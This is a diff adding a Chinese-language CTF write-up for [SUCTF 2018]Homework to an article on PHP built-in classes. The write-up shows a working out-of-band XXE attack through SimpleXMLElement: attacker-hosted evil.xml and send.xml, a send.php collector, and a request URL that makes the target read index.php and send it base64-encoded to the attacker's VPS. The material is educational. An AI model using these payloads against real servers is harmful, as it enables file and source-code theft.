@@ -515,7 +515,92 @@ foreach ($obj as $content) {
 
 - 适用于PHP 5, PHP 7, PHP 8
 
-通过设置第三个参数 data_is_url 为 `true`，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为`2`即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。
+通过设置第三个参数 `data_is_url` 为 `true`，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为`2`即可。第一个参数 `data` 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。
 
 这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。
 
+## [SUCTF 2018]Homework
+进入题目，随便注册一个账号，登录作业平台。看到一个 `calc` 计算器类的代码。有两个按钮，一个用于调用 `calc` 类实现两位数的四则运算。另一个用于上传文件，提交代码。
+
+
+
+![](https://xzfile.aliyuncs.com/media/upload/picture/20210329180254-ee1ea4ce-9075-1.png)
+
+`calc` 计算器类的代码为：
+
+<?php 
+class calc{
+    function __construct__(){
+        calc();
+    }
+
+    function calc($args1,$method,$args2){
+        $args1=intval($args1);
+        $args2=intval($args2);
+        switch ($method) {
+            case 'a':
+                $method="+";
+                break;
+
+            case 'b':
+                $method="-";
+                break;
+
+            case 'c':
+                $method="*";
+                break;
+
+            case 'd':
+                $method="/";
+                break;
+
+            default:
+                die("invalid input");
+        }
+        $Expression=$args1.$method.$args2;
+        eval("\$r=$Expression;");
+        die("Calculation results:".$r);
+    }
+}
+?>
+
+我们点击calc按钮，计算2+2=4，我们观察url处的参数，再结合`calc`计算器类的代码可知module为调用的类，args为类的构造方法的参数：
+
+![](https://xzfile.aliyuncs.com/media/upload/picture/20210329180254-ee40db3e-9075-1.png)
+
+所以我们可以通过这种形式调用PHP中的内置类。这里我们通过调用 SimpleXMLElement 这个内置类来构造 XXE。
+
+首先，我们在vps（47.xxx.xxx.72）上构造如下evil.xml、send.xml和send.php这三个文件。
+
+evil.xml：
+
+<?xml version="1.0"?>
+<!DOCTYPE ANY[
+<!ENTITY % remote SYSTEM "http://47.xxx.xxx.72/send.xml">
+%remote;
+%all;
+%send;
+]>
+
+send.xml：
+
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://47.xxx.xxx.72/send.php?file=%file;'>">
+
+send.php：
+
+<?php 
+file_put_contents("result.txt", $_GET['file']) ;
+?>
+
+然后在url中构造如下：
+
+/show.php?module=SimpleXMLElement&args[]=http://47.xxx.xxx.72/evil.xml&args[]=2&args[]=true
+
+这样目标主机就能先加载我们vps上的evil.xml，再加载send.xml。
+
+如下图所示，成功将网站的源码以base64编码的形式读取并带出到result.txt中：
+
+![](https://xzfile.aliyuncs.com/media/upload/picture/20210329180255-ee78f938-9075-1.png)
+
+后续解题过程就不写了。
